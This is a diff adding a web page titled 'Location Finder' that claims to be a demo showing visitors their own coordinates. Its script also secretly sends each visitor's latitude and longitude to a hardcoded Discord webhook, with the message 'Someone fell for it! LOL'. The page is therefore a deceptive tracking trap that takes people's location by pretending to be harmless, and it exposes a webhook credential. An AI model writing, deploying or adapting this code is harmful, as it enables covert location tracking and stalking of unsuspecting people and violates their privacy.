@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Finder</title>
+    <style>
+        body {
+            background: #1a1a1a;
+            color: #a1a1a1;
+            font-family: Arial;
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        p {
+            text-align: center;
+        }
+
+        button {
+            border: 1px black none;
+            background-color: orange;
+            color: black;
+            border-radius: 2.5px;
+            padding: 10px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            margin: 0 auto;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Location Finder</h1>
+<p>This is a demo location finder! You can find your location easily.</p>
+<button onclick="getLocation()">Get My Location</button>
+
+<p id="demo"></p>
+
+<script>
+function getLocation() {
+    document.getElementById("demo").innerHTML = "Working on it....";
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else {
+        document.getElementById("demo").innerHTML = "Geolocation is not supported by this browser.";
+    }
+}
+
+function showPosition(position) {
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
+    document.getElementById("demo").innerHTML = "Latitude: " + latitude + "<br>Longitude: " + longitude;
+    const webhookUrl = 'https://discord.com/api/webhooks/1199592130130223164/bCSCjJhy5PB3WAn5M5Q57U50iHDQ83utcnvlUCF6kovdCKdwyPeC8S-AKYvznLNxvjDs';
+
+    const message = {
+        content: 'Someone fell for it! LOL:\n\nLATITUDE: ' + latitude + '\nLONGITUDE: ' + longitude,
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        return response.json();
+    })
+    .then(data => {
+        console.log('Message sent successfully:', data);
+    })
+    .catch(error => {
+        console.error('Error sending message:', error);
+    });
+}
+
+function showError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            document.getElementById("demo").innerHTML = "User denied the request for Geolocation.";
+            break;
+        case error.POSITION_UNAVAILABLE:
+            document.getElementById("demo").innerHTML = "Location information is unavailable.";
+            break;
+        case error.TIMEOUT:
+            document.getElementById("demo").innerHTML = "The request to get user location timed out.";
+            break;
+        case error.UNKNOWN_ERROR:
+            document.getElementById("demo").innerHTML = "An unknown error occurred.";
+            break;
+    }
+}
+</script>
+
+</body>
+</html>
